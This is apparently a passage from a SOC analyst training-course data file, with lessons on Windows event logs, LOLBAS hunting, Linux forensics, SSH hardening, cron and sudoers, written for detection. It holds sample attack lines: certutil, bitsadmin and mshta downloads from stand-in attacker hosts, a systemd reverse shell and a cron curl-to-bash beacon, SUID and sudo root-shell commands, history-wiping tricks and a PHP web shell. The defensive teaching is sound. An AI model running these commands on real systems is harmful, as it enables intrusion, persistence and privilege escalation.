An attacker could execute:
\`powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand SQBFAFgA...\`
and the default Event ID 4688 would only show \`Process Name: powershell.exe\`, leaving the SOC blind to the malicious payload!

### The Required Group Policy Setting
To achieve true SOC L1 visibility, security teams enable:
\`Computer Configuration -> Administrative Templates -> System -> Audit Process Creation -> Include command line in process creation events\`

Once enabled, Event ID 4688 populates the crucial field:
\`<Data Name="CommandLine">powershell.exe -w hidden -enc JABjAGwAaQBlAG4AdA...</Data>\`

### Key XML Fields in Event ID 4688:
* **\`NewProcessName\`**: The full filesystem path of the executable being launched (e.g. \`C:\\Windows\\System32\\cmd.exe\`).
* **\`ProcessId\`**: The hexadecimal PID of the new child process.
* **\`ParentProcessName\`**: The filesystem path of the program that spawned it (e.g. \`C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\`).
* **\`SubjectUserName\`**: The user or service account context under which the process is executing.
* **\`MandatoryLabel\`**: The integrity level (Low, Medium, High, or System).`,
        key_concept_bullets: [
          'Without Command Line Auditing enabled, Event 4688 is severely degraded.',
          'Look for Base64 encoded flags like "-enc", "-EncodedCommand", or "-w hidden".',
          'High integrity level processes running out of user temp directories (e.g. \`AppData\\Local\\Temp\`) indicate active privilege escalation.'
        ],
        analyst_takeaway: 'When hunting in your SIEM, immediately flag any instance of \`cmd.exe\` or \`powershell.exe\` where the parent process is \`WINWORD.EXE\`, \`EXCEL.EXE\`, \`OUTLOOK.EXE\`, \`w3wp.exe\` (IIS web server), or \`sqlservr.exe\`.'
      },
      {
        id: 'l19-sec3',
        chapter_number: 3,
        title: 'Hunting Living-off-the-Land Binaries (LOLBAS)',
        subtitle: 'Detecting attackers who abuse legitimate built-in Windows utilities',
        badge: 'LOLBAS HUNTING',
        reading_minutes: 5,
        content_markdown: `Sophisticated adversaries do not bring custom malware onto victim machines because antivirus scanners easily flag unknown \`.exe\` files. Instead, they use **LOLBAS (Living Off the Land Binaries and Scripts)**—pre-installed, trusted Windows system utilities that can be abused for malicious purposes.

### Top 4 Abused LOLBAS Utilities:

1. **\`certutil.exe\`** (Built-in Certificate Utility):
   * *Legitimate purpose*: Manage Windows cryptographic certificates.
   * *Attacker abuse*: Download external malware files to bypass browser download filters.
   * *Malicious Telemetry*: \`certutil.exe -urlcache -split -f http://evil-c2.com/payload.exe payload.exe\`

2. **\`bitsadmin.exe\`** (Background Intelligent Transfer Service):
   * *Legitimate purpose*: Asynchronous background operating system updates.
   * *Attacker abuse*: Download files and maintain stealthy persistence.
   * *Malicious Telemetry*: \`bitsadmin /transfer eviljob http://attacker.com/backdoor.dll C:\\temp\\b.dll\`

3. **\`mshta.exe\`** (Microsoft HTML Application Host):
   * *Legitimate purpose*: Execute legacy .HTA scripts.
   * *Attacker abuse*: Execute inline malicious JavaScript/VBScript without touching disk.
   * *Malicious Telemetry*: \`mshta vbscript:Close(Execute("GetObject(""script:http://c2.io/payload.sct"")"))\`

4. **\`rundll32.exe\`** / **\`regsvr32.exe\`**:
   * *Legitimate purpose*: Run functions exported by trusted DLLs.
   * *Attacker abuse*: Bypass AppLocker application whitelisting.`,
        key_concept_bullets: [
          'LOLBAS utilities are digitally signed by Microsoft, making them blend into normal noise.',
          'Hunt for unexpected network connections initiated by \`certutil.exe\` or \`mshta.exe\`.',
          'MITRE ATT&CK maps LOLBAS under T1059 (Command and Scripting Interpreter) and T1218 (System Binary Proxy Execution).'
        ],
        analyst_takeaway: 'In standard corporate environments, regular employees never run \`certutil -urlcache\` or \`bitsadmin /transfer\` from the command line. An alert containing these strings is a high-confidence True Positive.'
      }
    ]
  },

  // LEVEL 20: WINDOWS SECURITY MILESTONE LAB
  20: {
    level_id: 20,
    title: 'Windows Security Milestone: Full Domain Controller Kill-Chain Triage',
    module_name: 'Module 2 — Windows Fundamentals',
    difficulty: 'Advanced',
    estimated_study_time: '30 Minutes (Milestone Scenario Evaluation)',
    prerequisites: ['Levels 11–19 (All Windows Fundamentals Modules)'],
    sections: [
      {
        id: 'l20-sec1',
        chapter_number: 1,
        title: 'Active Directory Architecture & The Golden Telemetry Triangle',
        subtitle: 'How Kerberos, NTLM, and Domain Controllers log enterprise compromises',
        badge: 'ACTIVE DIRECTORY',
        reading_minutes: 5,
        content_markdown: `In enterprise networks, individual computers do not manage their own user databases. Instead, thousands of laptops, workstations, and servers join a centralized **Active Directory Domain** managed by specialized Windows servers called **Domain Controllers (DCs)**.

### The Three Pillars of Windows Investigation:
To successfully reconstruct an enterprise intrusion, a SOC analyst correlates three event streams:

\`\`\`
          [ 1. AUTHENTICATION ]
         (Event IDs 4624 / 4625)
                  ▲
                  │ (Who got in?)
                  │
[ 2. PROCESS CREATION ] ◄────► [ 3. PRIVILEGE USAGE ]
     (Event ID 4688)               (Event IDs 4672 / 4720 / 4728)
   (What did they run?)            (What rights were granted/escalated?)
\`\`\`

### Key Active Directory Event IDs for Tier 1 SOC:
* **\`4624\`**: Successful Logon. (LogonType 3 = Network Share, LogonType 10 = RDP).
* **\`4625\`**: Failed Logon. (SubStatus \`0xC000006A\` = Bad Password).
* **\`4672\`**: Special Privileges Assigned to New Logon (Assigned \`SeDebugPrivilege\` or Administrator rights).
* **\`4720\`**: A user account was created (Rogue backdoor account creation).
* **\`4728\`**: A member was added to a security-enabled global group (e.g. Added user to "Domain Admins").
* **\`7045\`**: A new service was installed (Common persistence and lateral movement mechanism used by PsExec).`,
        key_concept_bullets: [
          'Active Directory is the crown jewel of corporate networks; compromising the Domain Controller yields keys to the entire kingdom.',
          'Correlate Authentication (4624) -> Privilege Escalation (4672/4728) -> Process Spawning (4688).',
          'Event ID 7045 on a domain member indicates potential PsExec lateral movement.'
        ],
        analyst_takeaway: 'Any alert involving Event 4728 (User added to Domain Admins) outside of an approved Change Management ticket must be treated as an active P1 Critical Security Incident.'
      },
      {
        id: 'l20-sec2',
        chapter_number: 2,
        title: 'The 5-Step Incident Reconstruction Protocol',
        subtitle: 'Building a forensic timeline from initial brute force to domain persistence',
        badge: 'INCIDENT PLAYBOOK',
        reading_minutes: 6,
        content_markdown: `When a multi-stage intrusion alert lands in your SOC queue, follow this disciplined 5-step triage sequence:

### Step 1: Establish Initial Access (The "Patient Zero" Vector)
* Search SIEM logs for failed authentication bursts (**4625**) followed immediately by a single successful logon (**4624**).
* Record the **Source Workstation IP**, **Target Account**, and **LogonType**.

### Step 2: Identify Privilege Escalation & Account Manipulation
* Query for **4672** (Special Privileges Assigned) and check for elevated tokens (\`SeDebugPrivilege\`, \`SeImpersonatePrivilege\`).
* Search for rogue accounts (**4720**) and security group escalations (**4728**).

### Step 3: Map Process Spawning & Defense Evasion
* Filter Event ID **4688** by the compromised user SID.
* Inspect parent-child relationships for LOLBAS execution (\`certutil\`, \`powershell\`, \`vssadmin delete shadows\`).

### Step 4: Trace Lateral Movement
* Look for LogonType 3 (Network) across internal IP ranges (\`10.0.0.0/8\`, \`192.168.0.0/16\`).
* Inspect Event 7045 for newly registered remote services (\`PSEXESVC.exe\`).

### Step 5: Execute Rapid Containment
* 1. Disable the compromised user account in Active Directory.
* 2. Terminate active Kerberos ticket-granting sessions (Revoke TGT).
* 3. Issue host isolation commands via EDR to prevent the infected workstation from broadcasting packets across the LAN.`,
        key_concept_bullets: [
          'Timeline reconstruction requires matching timestamps with UTC normalization.',
          'LogonType 3 indicates lateral network traversal; LogonType 10 indicates remote interactive desktop control.',
          'Never remediate a single machine before identifying all laterally compromised nodes.'
        ],
        analyst_takeaway: 'A complete SOC report does not just say "malware found." It provides an unbroken timeline from the initial failed password spray to lateral movement and persistence.'
      }
    ]
  },

  // LEVEL 21: LINUX FILESYSTEM HIERARCHY (FHS)
  21: {
    level_id: 21,
    title: 'Linux Filesystem Hierarchy Standard (FHS): Forensics & Directory Boundaries',
    module_name: 'Module 3 — Linux Fundamentals',
    difficulty: 'Beginner',
    estimated_study_time: '25 Minutes (Comprehensive Mini-Course)',
    prerequisites: ['None (Module 3 Entry Point)'],
    sections: [
      {
        id: 'l21-sec1',
        chapter_number: 1,
        title: 'Zero-Knowledge Introduction: Everything in Linux is a File',
        subtitle: 'Understanding the single unified tree structure and root boundary',
        badge: 'FHS ARCHITECTURE',
        reading_minutes: 4,
        content_markdown: `If you have only used Windows, you are accustomed to drive letters: \`C:\\\`, \`D:\\\`, \`E:\\\`. 

In Linux, there are **no drive letters**. The entire operating system—including physical hard drives, USB thumbdrives, running processes, hardware devices, and network sockets—is organized under a **single unified tree structure** starting at the forward slash: \`/\` (known as **Root**).

### The "Everything is a File" Philosophy
In Linux:
* A physical hard drive is represented as a file: \`/dev/sda\`
* A running process’s memory is represented as a directory of files: \`/proc/1452/\`
* An active network interface is represented as a device file: \`/dev/net/tun\`

This design makes Linux incredibly powerful for SOC analysts because **forensic investigation consists of reading, searching, and filtering text files** using standard command-line tools.`,
        key_concept_bullets: [
          'Linux uses a single unified inverted tree starting at root (\`/\`).',
          'Forward slash (\`/\`) is used in Linux, unlike the Windows backslash (\`\\\`).',
          'Root directory (\`/\`) is the top of the filesystem; \`/root\` is the home directory of the root superuser.'
        ],
        analyst_takeaway: 'Because everything in Linux is a file, an attacker who gains file-writing privileges can modify running kernel parameters, manipulate memory, or plant persistent backdoors simply by editing standard configuration text files.'
      },
      {
        id: 'l21-sec2',
        chapter_number: 2,
        title: 'The Critical Forensic Directory Map',
        subtitle: 'Where logs live, where malware hides, and where system binaries reside',
        badge: 'DIRECTORY FORENSICS',
        reading_minutes: 5,
        content_markdown: `When investigating a compromised Linux server, you must know exactly which directories hold critical evidence:

| Directory | Purpose | Why the SOC Analyst Cares |
| :--- | :--- | :--- |
| \`/var/log/\` | Variable System Logs | **Primary Forensic Goldmine**. Contains \`auth.log\` (SSH logins), \`syslog\`, \`nginx/access.log\`, and audit records. |
| \`/etc/\` | System-Wide Configuration | Contains user rosters (\`/etc/passwd\`), password hashes (\`/etc/shadow\`), scheduled jobs (\`/etc/crontab\`), and sudo policies. |
| \`/tmp/\` & \`/var/tmp/\` | Temporary World-Writable Storage | **Primary Malware Landing Zone**. Every user on the system can write here, so web-exploit payloads and cryptocurrency miners are dropped here first. |
| \`/dev/shm/\` | Shared Memory (RAM-based Filesystem) | **Stealth Malware Staging**. Files written here exist only in RAM; they bypass traditional disk I/O monitoring. |
| \`/proc/\` | Virtual Kernel / Process Telemetry | Live running process state. Inspecting \`/proc/[PID]/exe\` points directly to the binary executing in memory, even if deleted from disk! |
| \`/bin\` & \`/sbin\` | Core System Binaries | Crucial OS tools (\`ls\`, \`cat\`, \`ps\`, \`iptables\`). Attackers replace these with rootkits to hide their presence. |
| \`/home/\` | User Home Directories | Holds user-specific SSH keys (\`~/.ssh/authorized_keys\`) and shell command history (\`~/.bash_history\`). |`,
        key_concept_bullets: [
          '\`/var/log\` is where 90% of your Linux triage begins.',
          '\`/tmp\` and \`/dev/shm\` are world-writable and the first places to inspect for dropped ELF binaries or Python scripts.',
          '\`/proc\` exposes live process memory directly through the filesystem.'
        ],
        analyst_takeaway: 'If an alert reports an unknown ELF binary executing out of \`/tmp\` or \`/dev/shm\`, it is almost certainly a True Positive web-shell or reverse-shell dropper.'
      }
    ]
  },

  // LEVEL 22: LINUX PERMISSIONS (chmod/chown/SUID)
  22: {
    level_id: 22,
    title: 'Linux User, Group & File Permissions: Mastering POSIX & SUID/SGID Abuse',
    module_name: 'Module 3 — Linux Fundamentals',
    difficulty: 'Beginner',
    estimated_study_time: '25 Minutes (Comprehensive Mini-Course)',
    prerequisites: ['Level 21 (Linux Filesystem Hierarchy)'],
    sections: [
      {
        id: 'l22-sec1',
        chapter_number: 1,
        title: 'The POSIX Triad: Read, Write, Execute (rwx = 4+2+1)',
        subtitle: 'Understanding owner, group, and other permission octals',
        badge: 'PERMISSIONS',
        reading_minutes: 4,
        content_markdown: `Every single file and directory in Linux has three distinct sets of permissions:
1. **User (Owner - \`u\`)**: The account that created or owns the file.
2. **Group (\`g\`)**: The collection of users assigned to collaborate on the file.
3. **Other (World - \`o\`)**: Every other account on the system.

### The Numerical (Octal) Permission System:
Each permission has a mathematical binary weight:
* **Read (\`r\`)** = **4** (Allows reading file contents or listing directory files).
* **Write (\`w\`)** = **2** (Allows modifying file contents or creating/deleting files in directory).
* **Execute (\`x\`)** = **1** (Allows running a script/binary or entering a directory).

\`\`\`
- r w x  r - x  r - -
  └──┬──┘  └──┬──┘  └──┬──┘
     │        │        │
  Owner    Group    Other
 (4+2+1)  (4+0+1)  (4+0+0)
   = 7      = 5      = 4   ──>  chmod 754 file.sh
\`\`\`

### Dangerous Permission Configurations:
* **\`chmod 777 filename\`**: Gives **EVERYONE** on the system full read, write, and execute rights. Any low-privileged web server user can overwrite this file with malicious shellcode!`,
        key_concept_bullets: [
          'Read = 4, Write = 2, Execute = 1.',
          'Standard secure file permissions for sensitive configs are 600 (Owner rw only) or 644 (Owner rw, world r).',
          '777 permissions are a critical security misconfiguration.'
        ],
        analyst_takeaway: 'Auditing Linux systems for world-writable configuration files (\`chmod 777 /etc/...\`) is one of the easiest ways to detect privilege escalation vulnerabilities before attackers exploit them.'
      },
      {
        id: 'l22-sec2',
        chapter_number: 2,
        title: 'Special Permissions: SUID, SGID, and The Threat of GTFOBins',
        subtitle: 'How standard utilities with the S-bit allow low-privilege users to spawn root shells',
        badge: 'SUID PRIV-ESC',
        reading_minutes: 5,
        content_markdown: `Under normal conditions, when a user executes a program (like \`cat\`), the program runs with **that user's privileges**.

However, Linux has a special permission called **SUID (Set User ID)** represented by an **\`s\`** in the owner execute position:
\`-rwsr-xr-x 1 root root 68208 /usr/bin/passwd\`

### Why SUID Exists Legally:
When an unprivileged student runs \`/usr/bin/passwd\` to change their password, the program needs to write the new password hash into \`/etc/shadow\`, which only \`root\` can touch. The SUID bit allows \`passwd\` to **temporarily run with the file owner's privileges (root)** during execution.

### The Attack Vector: SUID GTFOBins Abuse
If a system administrator mistakenly sets the SUID bit on standard system binaries like \`find\`, \`vim\`, \`bash\`, \`nmap\`, or \`python\`, an attacker can abuse built-in command execution features to drop directly into a permanent **Root Shell**!

### Example SUID Exploitation:
\`\`\`bash
# Attacker finds misconfigured SUID binary:
find / -perm -4000 -type f 2>/dev/null
# Output: /usr/bin/find has SUID root

# Attacker executes find with root exec flag:
/usr/bin/find . -exec /bin/sh -p \\; -quit
# Result: Immediate Root Shell ($ -> #)
\`\`\``,
        key_concept_bullets: [
          'SUID permission bit octal is 4000; displayed as "-rwsr-xr-x".',
          'SUID forces the binary to execute with the file owner permissions (often root), not the calling user.',
          'GTFOBins is the curated industry repository of Unix binaries that can be abused to bypass security restrictions.'
        ],
        analyst_takeaway: 'In SOC threat hunting, regularly search endpoint telemetry for unusual binaries executing with SUID bit set, especially \`/usr/bin/python\`, \`/usr/bin/find\`, or custom scripts in \`/opt\`.'
      }
    ]
  },

  // LEVEL 23: LINUX PROCESS MANAGEMENT & SYSTEMD
  23: {
    level_id: 23,
    title: 'Linux Process Management & Systemd Service Forensics: Hunting Daemons & Hidden Jobs',
    module_name: 'Module 3 — Linux Fundamentals',
    difficulty: 'Intermediate',
    estimated_study_time: '25 Minutes (Comprehensive Mini-Course)',
    prerequisites: ['Level 21 & 22 (Linux FHS & Permissions)'],
    sections: [
      {
        id: 'l23-sec1',
        chapter_number: 1,
        title: 'Linux Process Lifecycle: PIDs, PPIDs, Daemons & Zombies',
        subtitle: 'How Linux spawns tasks via fork/exec and how attackers masquerade processes',
        badge: 'PROCESS MANAGEMENT',
        reading_minutes: 4,
        content_markdown: `In modern Linux operating systems, the very first process started by the Linux kernel when the machine boots is **Systemd** (assigned **PID 1**). All other applications, background services (daemons), and user sessions on the system are children or descendants of PID 1.

### Essential Forensic Process Commands:
* **\`ps auxf\`**: Displays full process tree with command lines, user context, CPU/RAM usage, and parent-child visual indentation.
* **\`top\` / \`htop\`**: Live real-time resource monitor (crucial for spotting cryptocurrency miners consuming 99% CPU).
* **\`lsof -p [PID]\`**: Lists every open file, network socket, and loaded shared library used by that specific process.
* **\`lsof -i :[PORT]\`**: Identifies exactly which process is listening on a suspicious network port.
* **\`ss -tulpn\`**: Displays all active TCP/UDP listening sockets and the associated process name and PID.`,
        key_concept_bullets: [
          'PID 1 (Systemd or Init) is the ancestor of all Linux processes.',
          'ps auxf reveals parent-child process hierarchy.',
          'lsof and ss bridge the gap between network connections and running process IDs.'
        ],
        analyst_takeaway: 'If an alert triggers for an unknown outbound connection on port 4444, use \`ss -tulpn\` or \`lsof -i :4444\` to immediately isolate the executing binary.'
      },
      {
        id: 'l23-sec2',
        chapter_number: 2,
        title: 'Systemd Service Forensics & Malicious Unit Injection',
        subtitle: 'How attackers achieve reboot persistence by creating custom background services',
        badge: 'SYSTEMD PERSISTENCE',
        reading_minutes: 5,
        content_markdown: `Attackers who achieve root access do not want to lose their foothold if the server reboots. To maintain persistence, they create a rogue **Systemd Service Unit** in \`/etc/systemd/system/\`.

### Anatomy of a Malicious Systemd Unit:
\`\`\`ini
[Unit]
Description=System Security Telemetry Optimizer
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c "/bin/bash -i >& /dev/tcp/185.220.101.5/443 0>&1"
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
\`\`\`

### Why this is deadly:
1. The attacker disguises the service with an official-sounding name (*"Security Telemetry Optimizer"*).
2. The \`ExecStart\` line executes a persistent reverse shell back to their Command & Control (C2) server.
3. \`Restart=always\` ensures that even if the SOC analyst kills the process with \`kill -9 [PID]\`, Systemd will automatically restart the backdoor 10 seconds later!`,
        key_concept_bullets: [
          'Systemd unit files live in \`/etc/systemd/system/\` and \`/lib/systemd/system/\`.',
          'Inspect \`ExecStart\` directives for suspicious bash reverse shells or Python scripts.',
          'Check enabled services with \`systemctl list-unit-files --state=enabled\`.'
        ],
        analyst_takeaway: 'During an incident response investigation, never stop at simply killing a malicious PID. You must identify and delete the associated Systemd unit file, then run \`systemctl daemon-reload\`.'
      }
    ]
  },

  // LEVEL 24: SSH AUTHENTICATION & HARDENING
  24: {
    level_id: 24,
    title: 'SSH Authentication & Hardening: Cryptographic Handshakes, Keys & Attack Vectors',
    module_name: 'Module 3 — Linux Fundamentals',
    difficulty: 'Intermediate',
    estimated_study_time: '25 Minutes (Comprehensive Mini-Course)',
    prerequisites: ['Level 21–23 (Linux Core Skills)'],
    sections: [
      {
        id: 'l24-sec1',
        chapter_number: 1,
        title: 'How SSH Works: Asymmetric Key Exchange & Encrypted Tunnels',
        subtitle: 'Understanding Port 22, public vs private keys, and authorized_keys',
        badge: 'SSH PROTOCOL',
        reading_minutes: 4,
        content_markdown: `**SSH (Secure Shell)**, operating on **TCP Port 22**, is the universal standard for remote server administration. Unlike legacy Telnet (which sent passwords across the wire in clear plaintext), SSH encrypts 100% of the session.

### The SSH Key Pair Concept:
* **Private Key (\`id_rsa\` / \`id_ed25519\`)**: Stored on the administrator's local laptop. **Must NEVER be shared with anyone**.
* **Public Key (\`id_rsa.pub\`)**: Placed on the remote Linux server inside \`~/.ssh/authorized_keys\`.

When logging in, the server uses the public key to encrypt a random cryptographic challenge. Only the person holding the corresponding private key can decrypt it, verifying their identity without transmitting a password across the network.`,
        key_concept_bullets: [
          'SSH uses TCP Port 22 by default.',
          'Public keys live in \`~/.ssh/authorized_keys\`.',
          'Private keys must remain secret with strict permissions (\`chmod 600 ~/.ssh/id_rsa\`).'
        ],
        analyst_takeaway: 'In a compromised Linux server, always inspect every user\'s \`~/.ssh/authorized_keys\` file. Attackers frequently append their own public key to maintain permanent backdoor access.'
      },
      {
        id: 'l24-sec2',
        chapter_number: 2,
        title: 'Hardening SSH Configuration (/etc/ssh/sshd_config)',
        subtitle: 'Disabling root login, enforcing key-based auth, and rate-limiting brute force',
        badge: 'SSH HARDENING',
        reading_minutes: 5,
        content_markdown: `Out of the box, default Linux installations often permit password authentication and direct root logins, exposing the server to automated internet-wide botnet brute-forcing.

### The 4 Essential SSH Hardening Directives in \`/etc/ssh/sshd_config\`:

1. **\`PermitRootLogin no\`**
   * Forces administrators to log in as a standard user first, then escalate with \`sudo\`. This creates an immutable audit trail identifying *which* human accessed root.
2. **\`PasswordAuthentication no\`**
   * Completely disables password guessing. Attackers cannot brute-force a 4096-bit RSA or Ed25519 cryptographic key.
3. **\`MaxAuthTries 3\`**
   * Drops the network connection after 3 failed password attempts.
4. **\`AllowUsers sysadmin analyst\`**
   * Explicitly whitelists allowed accounts, preventing unapproved accounts from accessing SSH.`,
        key_concept_bullets: [
          'Never allow direct root SSH login (\`PermitRootLogin no\`).',
          'Enforce SSH key-only authentication (\`PasswordAuthentication no\`).',
          'Always restart sshd with \`systemctl restart sshd\` after modifying configuration.'
        ],
        analyst_takeaway: 'If an alert shows an external IP successfully logging in as root over SSH via password authentication, the server violated basic hardening baselines.'
      }
    ]
  },

  // LEVEL 25: LINUX AUTH.LOG & SECURE TRIAGE
  25: {
    level_id: 25,
    title: 'Linux /var/log/auth.log & secure Analysis: Triaging SSH Brute Force & Intrusions',
    module_name: 'Module 3 — Linux Fundamentals',
    difficulty: 'Intermediate',
    estimated_study_time: '25 Minutes (Comprehensive Mini-Course)',
    prerequisites: ['Level 24 (SSH Architecture)'],
    sections: [
      {
        id: 'l25-sec1',
        chapter_number: 1,
        title: 'Dissecting Linux Authentication Telemetry',
        subtitle: 'Ubuntu/Debian auth.log vs RHEL/CentOS secure log formats',
        badge: 'AUTH LOGS',
        reading_minutes: 4,
        content_markdown: `Every time a user attempts to log into a Linux system—whether locally at the console, remotely over SSH, or escalating privileges via \`sudo\`—the Linux **PAM (Pluggable Authentication Modules)** system writes an audit record to:
* **Debian / Ubuntu**: \`/var/log/auth.log\`
* **RHEL / CentOS / Rocky Linux**: \`/var/log/secure\`

### Anatomy of a Linux Auth Log Entry:
\`\`\`
Sep 01 03:14:22 web-prod-01 sshd[28491]: Failed password for invalid user admin from 185.220.101.7 port 48192 ssh2
│           │   │           │           │                               │                     │
Timestamp   Host Process     PID         Event Description               Target Account        Attacker IP
\`\`\`

### The Three Critical Auth Log Patterns:
1. **\`Failed password for invalid user [username]\`**: The attacker is attempting to log into an account that does not even exist on the server.
2. **\`Failed password for [valid_username]\`**: The username is legitimate, but the password provided was wrong (targeted password spraying).
3. **\`Accepted publickey for [username] from [IP]\`**: Successful cryptographic authentication.`,
        key_concept_bullets: [
          'Ubuntu uses \`/var/log/auth.log\`; RedHat uses \`/var/log/secure\`.',
          '"Failed password for invalid user" indicates broad dictionary scanning.',
          '"Accepted password" or "Accepted publickey" indicates successful access.'
        ],
        analyst_takeaway: 'In your SIEM, build a correlation rule: "Count > 50 Failed password events from a single IP within 5 minutes, followed by 1 Accepted event" to detect successful brute force breaches.'
      },
      {
        id: 'l25-sec2',
        chapter_number: 2,
        title: 'Command Line Forensics on Authentication Logs',
        subtitle: 'Extracting top attacker IPs and breached accounts with grep, awk, and sort',
        badge: 'BASH TRIAGE',
        reading_minutes: 5,
        content_markdown: `When triaging a live Linux server during an incident, you need fast answers without waiting for a SIEM indexer:

### 1. Extract Top 10 Attacking IPs Attempting Logins:
\`\`\`bash
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr | head -10
\`\`\`

### 2. Identify All Successful SSH Logins:
\`\`\`bash
grep "Accepted" /var/log/auth.log | awk '{print $1, $2, $3, "User:", $9, "From IP:", $11}'
\`\`\`

### 3. Check for Unauthorized Sudo Escalations:
\`\`\`bash
grep "sudo:" /var/log/auth.log | grep "COMMAND"
# Sample Output: user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/bin/bash
\`\`\``,
        key_concept_bullets: [
          'grep, awk, sort, and uniq are the core Bash triage toolkit for Linux SOC analysts.',
          'Always verify if a burst of failed logins terminated with an "Accepted" entry.',
          'Sudo commands in auth.log show the exact command executed as root.'
        ],
        analyst_takeaway: 'If you see 500 failed password lines followed by a single "Accepted" line from the same IP, that account has been compromised and the server is actively breached.'
      }
    ]
  },

  // LEVEL 26: CRONTAB & SUDOERS FORENSICS
  26: {
    level_id: 26,
    title: 'Linux Crontab & Sudoers Privilege Escalation Forensics: Hidden Persistence & Root Leaks',
    module_name: 'Module 3 — Linux Fundamentals',
    difficulty: 'Intermediate',
    estimated_study_time: '25 Minutes (Comprehensive Mini-Course)',
    prerequisites: ['Level 21–25 (Linux Triage Skills)'],
    sections: [
      {
        id: 'l26-sec1',
        chapter_number: 1,
        title: 'Linux Scheduled Tasks: Crontab Architecture & Abuse',
        subtitle: 'Where scheduled jobs hide and how attackers maintain stealthy beaconing',
        badge: 'CRON FORENSICS',
        reading_minutes: 4,
        content_markdown: `**Cron** is the standard Linux task scheduler used for periodic maintenance (e.g. running backups every night at 2:00 AM). Because cron runs automatically with the privileges of the user who owns the crontab, attackers frequently plant **cron reverse shells**.

### The 5 Locations Where Cron Jobs Reside:
1. **User Crontabs**: \`/var/spool/cron/crontabs/[username]\` (Checked via \`crontab -l -u [user]\`).
2. **System-Wide Crontab**: \`/etc/crontab\`.
3. **Cron Directory Drops**: \`/etc/cron.d/\`, \`/etc/cron.daily/\`, \`/etc/cron.hourly/\`.
4. **Anacron Jobs**: \`/etc/anacrontab\`.
5. **Systemd Timers**: Modern replacement for cron (\`systemctl list-timers\`).

### Malicious Crontab Payload Example:
\`\`\`cron
# Run every 10 minutes, pipe output to dev/null
*/10 * * * * root curl -s http://185.220.101.5/beacon.sh | /bin/bash >/dev/null 2>&1
\`\`\``,
        key_concept_bullets: [
          'Cron jobs execute automatically in the background without interactive user presence.',
          'Check all user crontabs and system directories (\`/etc/cron.*\`).',
          'Modern Linux also uses Systemd Timers as scheduled execution mechanisms.'
        ],
        analyst_takeaway: 'During Linux post-incident remediation, always inspect \`/var/spool/cron/crontabs\` and \`/etc/cron.d\`. Failing to remove a persistence cron will result in the attacker regaining access within minutes.'
      },
      {
        id: 'l26-sec2',
        chapter_number: 2,
        title: 'The /etc/sudoers File: Misconfigurations & Root Leaks',
        subtitle: 'Hunting NOPASSWD entries, wildcard exploits, and privilege escalation vectors',
        badge: 'SUDOERS SECURITY',
        reading_minutes: 5,
        content_markdown: `The \`/etc/sudoers\` file defines which users or groups can execute commands with superuser (\`root\`) privileges. 

### The Danger of \`NOPASSWD\`:
When system administrators want to allow a script or developer to run a specific command without typing their password, they add:
\`\`\`sudoers
# DANGEROUS WILDCARD / NOPASSWD MISCONFIGURATION:
developer ALL=(ALL) NOPASSWD: /usr/bin/find, /usr/bin/vim, /usr/bin/less
\`\`\`

### How an Attacker Exploits This:
If an attacker compromises the \`developer\` account:
1. They run \`sudo -l\` to list allowed sudo privileges.
2. They see \`/usr/bin/vim\` is allowed without password.
3. They execute: \`sudo vim -c ':!/bin/sh'\`
4. **Result**: Vim launches a root shell without ever requesting a password!`,
        key_concept_bullets: [
          '\`sudo -l\` lists the current user\'s available sudo permissions.',
          'NOPASSWD on binaries listed in GTFOBins is an instant root compromise.',
          'The sudoers configuration must always be edited using \`visudo\` to prevent syntax corruption.'
        ],
        analyst_takeaway: 'Whenever investigating a compromised low-privilege user account on Linux, check \`sudo -l\` immediately to determine if the attacker has an open path to full root takeover.'
      }
    ]
  },

  // LEVEL 27: BASH COMMAND LINE FORENSICS
  27: {
    level_id: 27,
    title: 'Bash Command Line Forensics & Shell History: Unmasking Web Shells & Anti-Forensics',
    module_name: 'Module 3 — Linux Fundamentals',
    difficulty: 'Intermediate',
    estimated_study_time: '25 Minutes (Comprehensive Mini-Course)',
    prerequisites: ['Level 21–26 (Linux Operational Forensics)'],
    sections: [
      {
        id: 'l27-sec1',
        chapter_number: 1,
        title: 'Shell History Mechanics & Anti-Forensic Evasion',
        subtitle: 'How bash logs commands, timestamping history, and detecting history wiping',
        badge: 'SHELL FORENSICS',
        reading_minutes: 4,
        content_markdown: `Every interactive Bash shell logs commands executed by the user into \`~/.bash_history\`. 

### Enabling Forensic Timestamps in Bash:
By default, \`.bash_history\` only lists raw commands without dates or times. SOC engineers add to \`/etc/profile\`:
\`export HISTTIMEFORMAT="%F %T "\`
This records exact UTC timestamps for every executed command:
\`\`\`
#1725178462
2026-09-01 03:14:22 curl -O http://malicious.io/rootkit.tar.gz
#1725178475
2026-09-01 03:14:35 tar -xzvf rootkit.tar.gz
\`\`\`

### Common Attacker Anti-Forensic Techniques:
1. **\`unset HISTFILE\`**: Prevents the current session from saving any history to disk.
2. **\`kill -9 $$\`**: Kills the current shell process immediately, bypassing the history write-on-exit buffer.
3. **\`history -c && history -w\`**: Clears the in-memory history and overwrites the history file with blank contents.
4. **Leading Spaces**: In systems configured with \`HISTCONTROL=ignorespace\`, typing a space before a command (\` whoami\`) prevents it from being logged.`,
        key_concept_bullets: [
          '\`~/.bash_history\` records interactive command execution.',
          'HISTTIMEFORMAT attaches forensic timestamps to history logs.',
          'A blank or missing \`.bash_history\` file on an active account is a strong indicator of anti-forensic tampering.'
        ],
        analyst_takeaway: 'If an employee account has a 0-byte \`.bash_history\` file, check \`/var/log/audit/audit.log\` or EDR process logs—the attacker likely wiped their shell history to hide their tracks.'
      },
      {
        id: 'l27-sec2',
        chapter_number: 2,
        title: 'Web Shell Detection & Hunting in /var/www/html',
        subtitle: 'Locating malicious PHP, JSP, and Python backdoors dropped on web servers',
        badge: 'WEB SHELL HUNTING',
        reading_minutes: 5,
        content_markdown: `The most common initial access vector against Linux servers is exploiting a vulnerable web application (WordPress plugin, Apache Struts, unvalidated file upload) to drop a **Web Shell** into the web root (\`/var/www/html\`).

### Anatomy of a Simple One-Line PHP Web Shell:
\`\`\`php
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; } ?>
\`\`\`
